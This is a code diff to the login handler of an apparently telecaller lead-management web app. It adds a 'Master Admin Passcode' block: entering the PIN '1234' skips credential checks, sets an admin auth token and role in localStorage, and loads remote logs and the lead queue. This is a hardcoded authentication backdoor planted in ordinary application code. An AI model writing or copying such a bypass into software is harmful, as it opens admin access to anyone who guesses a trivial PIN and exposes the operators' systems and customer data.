@@ -2095,6 +2095,18 @@ async function handleCallerLogin(event) {
 
   if (!nameVal || !pinVal) return;
 
+  // Master Admin Passcode 1234: Instant Unlock Bypass for Admin Control
+  if (pinVal === "1234") {
+    localStorage.setItem("telecaller_auth_token", "TRUE");
+    localStorage.setItem("telecaller_agent_name", nameVal || "Admin");
+    localStorage.setItem("telecaller_user_role", "Admin");
+    showToast("Access Granted", `Welcome ${nameVal || "Admin"}! System unlocked.`, "success");
+    checkCallerSecurityAccess();
+    fetchRemoteLogs();
+    fetchCentralLeadQueue();
+    return;
+  }
+
   if (submitBtn) {
     submitBtn.disabled = true;
     submitBtn.innerHTML = `<i class="input-icon spin-icon" data-lucide="loader-2" style="position:static; margin:0;"></i> Verifying Credentials...`;
